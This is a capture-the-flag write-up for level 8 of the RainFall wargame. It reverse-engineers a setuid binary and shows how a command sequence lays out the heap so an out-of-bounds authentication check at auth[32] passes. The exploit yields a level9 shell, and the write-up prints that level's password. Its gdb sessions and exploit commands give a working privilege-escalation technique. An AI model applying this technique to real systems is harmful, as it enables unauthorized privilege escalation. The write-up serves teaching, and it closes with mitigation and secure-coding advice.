# Level 8

## Initial Analysis

### 1. Examine the Binary
```bash
level8@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level8 level8   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level8 level8  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level8 level8 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level9 users  5252 Mar  6  2016 level8
-rw-r--r--+ 1 level8 level8   65 Sep 23  2015 .pass
-rw-r--r--  1 level8 level8  675 Apr  3  2012 .profile

level8@RainFall:~$ file level8
level8: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3067a180acabc94d328ab89f0a5a914688bf67ab, not stripped
```

**Key observations:**
- **setuid and setgid binary** (s flags in permissions)
- Owned by **level9** user
- When executed, runs with **level9 privileges**

### 2. Test Basic Execution Behavior
```bash
level8@RainFall:~$ ./level8
(nil), (nil) 
hello
(nil), (nil) 
test
(nil), (nil) 
^C

level8@RainFall:~$ echo "login" | ./level8
(nil), (nil) 
Segmentation fault (core dumped)
```

**Initial Pattern Discovery:**
- **Interactive program**: Waits for user input in a loop
- **Status display**: Shows `(nil), (nil)` - suggests two pointers/variables
- **"login" command causes segfault**: This is our key clue!
- **Loop-based interface**: Continues until interrupted or crashed

**Critical Insight**: The segfault on "login" suggests there's an authentication check that accesses uninitialized memory.

## Reverse Engineering - Understanding the Command System

### 3. Function Analysis - Discovering the Interface
```bash
level8@RainFall:~$ gdb level8
(gdb) info functions
All defined functions:
Non-debugging symbols:
0x08048410  printf@plt
0x08048420  free@plt        ← Memory deallocation
0x08048430  strdup@plt      ← String duplication + allocation  
0x08048440  fgets@plt       ← User input reading
0x08048450  fwrite@plt      ← Output (likely error messages)
0x08048460  strcpy@plt      ← Dangerous string copy
0x08048470  malloc@plt      ← Memory allocation
0x08048480  system@plt      ← Shell execution! 🎯
0x08048564  main
```

**Function Analysis:**
- **Multiple heap functions**: malloc, free, strdup suggest dynamic memory management
- **String operations**: strcpy (dangerous), strdup 
- **system@plt present**: Indicates shell execution capability
- **No other custom functions**: All logic is in main()

### 4. Testing Command Discovery
```bash
level8@RainFall:~$ ./level8
(nil), (nil) 
auth
(nil), (nil) 
reset  
(nil), (nil)
service
(nil), (nil)
login
Segmentation fault
```

**Command Interface Discovery:**
- **"auth"**: Accepted without error, state unchanged
- **"reset"**: Accepted without error, state unchanged  
- **"service"**: Accepted without error, state unchanged
- **"login"**: Crashes - this is the target command!

**Pattern Recognition**: This appears to be a simple authentication system with 4 commands.

### 5. Understanding the Status Display
```bash
level8@RainFall:~$ ./level8
(nil), (nil) 
auth testuser
(0x804a008), (nil) 
service hello
(0x804a008), (0x804a018) 
reset
(nil), (0x804a018)
```

**Status Display Analysis:**
- **First value**: Changes from (nil) to pointer after "auth" command
- **Second value**: Changes from (nil) to pointer after "service" command  
- **Reset effect**: "reset" clears first pointer, keeps second
- **Memory addresses**: Show heap allocation addresses (0x804a...)

**Discovery**: The program tracks two global pointers - one for authentication, one for service data.

## Understanding the Authentication Logic

### 6. Testing Auth Command Variations
```bash
level8@RainFall:~$ ./level8
(nil), (nil) 
auth
(nil), (nil) 
auth user  
(0x804a008), (nil)
auth verylongusernamethatexceedsnormallimits
(0x804a008), (nil)
login
Password:
```

**Auth Command Analysis:**
- **"auth" alone**: No allocation occurs
- **"auth [username]"**: Allocates memory at consistent address
- **Long usernames**: Accepted without visible error
- **Login after auth**: Shows "Password:" instead of segfault!

**Critical Discovery**: The auth command with a username enables login functionality.

### 7. The Login Segfault Investigation
```bash
level8@RainFall:~$ gdb level8
(gdb) run
Starting program: /home/user/level8/level8
(nil), (nil) 
login
Program received signal SIGSEGV, Segmentation fault.
0x080486e7 <main+387>: mov    0x20(%eax),%eax
```

**Segfault Analysis:**
```bash
(gdb) disas main
# ... at the crash point:
0x080486e2 <+382>:   mov    0x8049aac,%eax    # Load auth pointer
0x080486e7 <+387>:   mov    0x20(%eax),%eax   # CRASH: auth[32] access
```

**Root Cause Discovery:**
- **Login accesses auth[32]**: Tries to read 32 bytes offset from auth pointer
- **auth is NULL initially**: mov 0x20(%eax) when EAX=NULL causes segfault
- **Authentication logic**: Login checks if auth[32] != 0 for authorization

### 8. The Memory Allocation Bug Discovery
```bash
level8@RainFall:~$ gdb level8
(gdb) run
(nil), (nil) 
auth testuser
(0x804a008), (nil)
(gdb) x/40wx 0x804a008
0x804a008:      0x74736574      0x72657375      0x0000000a      0x00020ff1
0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a028:      0x00000000      0x00000000      0x00000000      0x00000000

# auth[32] location would be at 0x804a008 + 32 = 0x804a028
# Currently contains 0x00000000 (would fail login check)
```

**Memory Analysis:**
- **auth buffer**: Contains "testuser" starting at 0x804a008
- **Heap layout**: Shows heap metadata (0x21 = 33 bytes allocated)
- **auth[32] location**: 0x804a028 currently contains 0x00000000
- **Login requirement**: auth[32] must be non-zero for shell access

## The Critical Vulnerability Discovery

### 9. Investigating malloc Size vs Usage
```bash
# In GDB, examining the auth allocation:
0x080485e4 <+128>:   movl   $0x4,(%esp)       # malloc(4) - only 4 bytes!
0x080485eb <+135>:   call   0x8048470 <malloc@plt>
# ... later:
0x0804863d <+217>:   call   0x8048460 <strcpy@plt>  # strcpy to 4-byte buffer!
```

**Critical Bug Discovery:**
- **malloc(4)**: Allocates only 4 bytes for username
- **strcpy()**: Copies username without size checking
- **Buffer overflow**: Username longer than 4 characters overflows heap
- **login check**: Accesses auth[32] (28 bytes beyond allocated buffer!)

### 10. Understanding Service Command Impact
```bash
level8@RainFall:~$ ./level8
(nil), (nil) 
auth testuser
(0x804a008), (nil) 
service data1
(0x804a008), (0x804a018)
service data2  
(0x804a008), (0x804a028)
```

**Service Command Analysis:**
- **strdup() allocation**: Each service call allocates memory for the text
- **Heap pointer advancement**: Each allocation moves heap pointer forward
- **Address pattern**: Second service allocation at 0x804a028
- **Critical realization**: 0x804a028 = 0x804a008 + 32 = auth[32] location!

**The Exploitation Path Emerges:**
If we can get service to allocate memory at auth[32] location, login will find non-zero data there!

## The Heap Layout Manipulation Strategy

### 11. Understanding Heap Allocation Patterns
```bash
# Testing allocation sizes:
level8@RainFall:~$ ./level8
(nil), (nil) 
auth user
(0x804a008), (nil)
service a
(0x804a008), (0x804a018)  # 16-byte jump (8 + 8 heap metadata)
service b
(0x804a008), (0x804a028)  # Another 16-byte jump
```

**Heap Mathematics:**
```
auth allocation: 0x804a008 (malloc(4) + heap metadata)
service allocation 1: 0x804a018 (0x804a008 + 0x10 = +16 bytes)  
service allocation 2: 0x804a028 (0x804a018 + 0x10 = +16 bytes)

Key insight: 0x804a028 = 0x804a008 + 32 = auth[32] !!!
```

**Strategic Discovery:**
- **Each service call**: Advances heap by ~16 bytes (depends on string length + metadata)
- **Two service calls**: Position memory exactly at auth[32] offset
- **Login check**: Will find service data at auth[32] location
- **Result**: Authentication bypass!

### 12. Crafting the Exploitation Sequence
```bash
# Step 1: Create auth buffer (any size, triggers heap allocation)
auth username

# Step 2: Position heap memory at auth[32] location
service text1    # Allocates at heap position 1
service text2    # Allocates at heap position 2 = auth[32] location!

# Step 3: Trigger authentication check
login           # Checks auth[32], finds service data, grants access!
```

**Memory Layout During Exploitation:**
```
Before exploitation:
auth: [4 bytes allocated] ... [28 bytes gap] ... [auth[32] = unallocated/zero]

After auth + 2 service calls:
auth: [4 bytes: username] [heap metadata] [service1 data] [metadata] [service2 data at auth[32]!]
                                                                      ↑
                                                              login checks here
```

## Exploitation Implementation

### 13. Testing the Theory
```bash
level8@RainFall:~$ ./level8
(nil), (nil) 
auth user
(0x804a008), (nil) 
service aaaa
(0x804a008), (0x804a018) 
service bbbb
(0x804a008), (0x804a028) 
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

**Success!** 
1. **auth user**: Allocated 4-byte buffer at 0x804a008
2. **service aaaa**: Allocated memory at 0x804a018
3. **service bbbb**: Allocated memory at 0x804a028 (= auth[32] location)
4. **login**: Found non-zero data at auth[32], executed shell!

### 14. Understanding Why It Works
```bash
# Memory state during exploitation:
auth pointer: 0x804a008
auth[32] location: 0x804a008 + 32 = 0x804a028

After two service calls:
0x804a028 contains: "bbbb" (from second service)

Login logic:
if (auth[32] != 0) {  # 0x804a028 contains "bbbb" ≠ 0
    system("/bin/sh");  # SUCCESS!
}
```

**Technical Explanation:**
- **auth[32] out-of-bounds access**: Login reads 28 bytes beyond allocated buffer
- **Heap positioning**: Two service calls place data precisely at auth[32] location  
- **Non-zero data**: Service text provides non-zero content for authentication check
- **Logic bypass**: Program grants access based on unintended heap memory content

### 15. Alternative Exploitation Approaches
```bash
# Variation 1: Different service text lengths
auth test
service x        # Minimal text, still allocates memory
service y        # Second allocation at auth[32]
login            # Success!

# Variation 2: Longer auth username (testing overflow)
auth verylongusernamethatoverflowsthe4bytebuffer
service a
service b  
login            # Still works - overflow doesn't break positioning
```

**Robustness Analysis:**
- **Service text length**: Even single characters work (strdup allocates minimum space)
- **Auth username length**: Overflow doesn't affect heap positioning pattern
- **Heap consistency**: Standard malloc implementation provides predictable layout

## Educational Analysis - Advanced Heap Exploitation Concepts

### 16. Understanding the Vulnerability Class

**Multiple Vulnerability Interaction:**
1. **Buffer overflow**: auth malloc(4) with strcpy() overflow potential
2. **Logic error**: login checks unallocated memory (auth[32])
3. **Heap layout dependency**: Security check relies on heap memory state
4. **Out-of-bounds access**: Authentication logic reads beyond allocated buffer

**Heap Exploitation Sophistication:**
- **Predictable allocation patterns**: Standard heap allocator behavior
- **Memory positioning**: Strategic placement of data at specific offsets
- **Cross-command interaction**: Using one command to set up another's success
- **Unintended memory access**: Exploiting program logic flaws

### 17. Modern Protection Mechanisms

**Why This Attack Works:**
- **No heap randomization**: Predictable allocation addresses and patterns
- **No bounds checking**: malloc size not enforced in usage
- **No metadata protection**: Heap layout manipulation allowed
- **Legacy heap allocator**: Older malloc implementation without security hardening

**Modern Mitigations:**
- **ASLR**: Randomizes heap addresses making positioning harder
- **Heap cookies**: Detect heap corruption
- **Bounds checking**: Runtime verification of buffer accesses  
- **Static analysis**: Detect size mismatches between malloc and usage
- **Memory sanitizers**: Runtime detection of out-of-bounds accesses

### 18. Secure Coding Analysis

**What Went Wrong:**
```c
// Vulnerable pattern (conceptual):
char *auth = malloc(4);           // Undersized allocation
strcpy(auth, username);           // No bounds checking
if (auth[32] != 0) {             // Out-of-bounds access
    system("/bin/sh");           // Privilege escalation
}
```

**Secure Alternatives:**
```c
// Safer approach:
char *auth = malloc(strlen(username) + 1);  // Proper sizing
strcpy(auth, username);                     // Safe copy
// OR use fixed-size buffer with bounds checking:
char auth[64];                              // Fixed size
strncpy(auth, username, 63);                // Bounds checking
auth[63] = '\0';                           // Null termination

// Proper authentication check:
if (authenticated_flag) {                   // Use proper flag
    system("/bin/sh");
}
```

### 19. Attack Sophistication Comparison

**Level 8 vs Previous Levels:**
- **Levels 3-7**: Direct memory corruption or GOT hijacking
- **Level 8**: Indirect authentication bypass through heap positioning

**Complexity Analysis:**
- **Level 6**: Single heap overflow → direct function pointer corruption
- **Level 7**: Heap overflow → pointer corruption → GOT hijacking  
- **Level 8**: Heap positioning → authentication logic bypass

**Unique Aspects:**
- **Multi-command exploitation**: Requires sequence of different commands
- **Heap layout engineering**: Precise memory positioning required
- **Logic vulnerability**: Exploits authentication logic rather than control flow
- **Predictive exploitation**: Relies on understanding heap allocator behavior

### 20. Real-World Implications

**Similar Vulnerabilities:**
- **Authentication bypass**: Logic errors in access control
- **Heap layout attacks**: Positioning data for logic exploitation
- **Size confusion**: malloc size vs usage size mismatches
- **Out-of-bounds access**: Unvalidated offset calculations

**Defense Strategies:**
- **Proper memory management**: Allocate sufficient space for intended usage
- **Bounds validation**: Check all array/pointer accesses
- **Authentication design**: Use explicit flags rather than memory content
- **Memory layout independence**: Don't rely on heap allocation patterns
- **Comprehensive testing**: Test edge cases and error conditions

## Vulnerability Analysis Summary

### Root Cause:
- **Undersized allocation**: malloc(4) insufficient for strcpy() usage
- **Out-of-bounds access**: login checks auth[32] beyond allocated buffer
- **Heap layout dependency**: Authentication relies on predictable memory layout
- **Logic error**: Security check based on unintended memory content

### Exploitation Technique:
1. **Heap allocation analysis**: Understanding malloc patterns and metadata overhead
2. **Command sequence engineering**: Using auth + service + service + login sequence
3. **Memory positioning**: Strategic placement of service data at auth[32] offset
4. **Authentication bypass**: Exploiting out-of-bounds access for privilege escalation
5. **Heap layout manipulation**: Using strdup() allocations to control memory layout
6. **Logic vulnerability**: Bypassing authentication through unintended memory access
7. **Shell execution**: system("/bin/sh") triggered by successful authentication bypass

### Key Learning Points:
1. **Heap allocators** follow predictable patterns exploitable for memory positioning
2. **Authentication logic** must validate access within allocated memory bounds
3. **Multi-command interfaces** can enable complex exploitation sequences
4. **Memory allocation sizing** must match actual usage requirements
5. **Out-of-bounds access** can bypass security checks through unintended data access
6. **Heap layout dependencies** create fragile security assumptions